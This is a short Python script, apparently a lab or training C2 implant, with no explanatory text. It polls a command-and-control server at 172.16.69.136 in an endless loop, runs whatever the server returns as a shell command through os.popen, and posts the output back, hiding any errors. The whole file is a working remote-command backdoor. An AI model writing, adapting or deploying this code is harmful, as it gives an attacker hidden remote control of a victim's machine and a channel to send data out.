import os
import http.client
import time

while 1:
    try:
        c2_connection = http.client.HTTPConnection('172.16.69.136')
        c2_connection.request("GET","/")
        param = os.popen(c2_connection.getresponse().read()).read()
        time.sleep(5)
        c2_connection.request("POST", " ", param)
        time.sleep(5)
    except:
        time.sleep(5)


# print(c2_connection.getresponse())
